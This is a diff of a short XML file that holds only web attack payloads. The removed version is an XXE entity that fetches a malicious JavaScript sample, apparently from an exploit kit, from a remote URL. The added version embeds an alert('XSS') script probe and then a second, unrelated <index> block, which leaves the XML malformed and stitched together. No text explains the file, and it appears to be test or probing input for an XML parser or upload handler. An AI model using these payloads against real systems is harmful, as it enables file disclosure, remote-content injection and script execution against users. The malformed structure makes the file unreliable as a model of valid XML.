@@ -1,5 +1,20 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
-  <!ENTITY xxe SYSTEM "https://raw.githubusercontent.com/geeksonsecurity/js-malicious-dataset/refs/heads/master/misc/0515php_layer2_FlashEK_2014-06-06.js">
-]>
-<root>&xxe;</root>
+<?xml version='1.0' encoding='utf-8'?>
+<root>
+  <script><![CDATA[alert('XSS');]]></script>
+</root>
+<index>
+<use_single_page>false</use_single_page>
+<file_name><![CDATA[1]]></file_name>
+<file_type>png</file_type>
+<w_m>false</w_m>
+<pdf_cnt>1</pdf_cnt>
+<pdf_list>
+<pdf>
+<id>1</id>
+<title>Page 1</title>
+<path_html><![CDATA[https://raw.githubusercontent.com/humanoid451/bkjn/refs/heads/master/1.png]]></path_html>
+<w>1121</w>
+<h>793</h>
+</pdf>
+</pdf_list>
+</index>
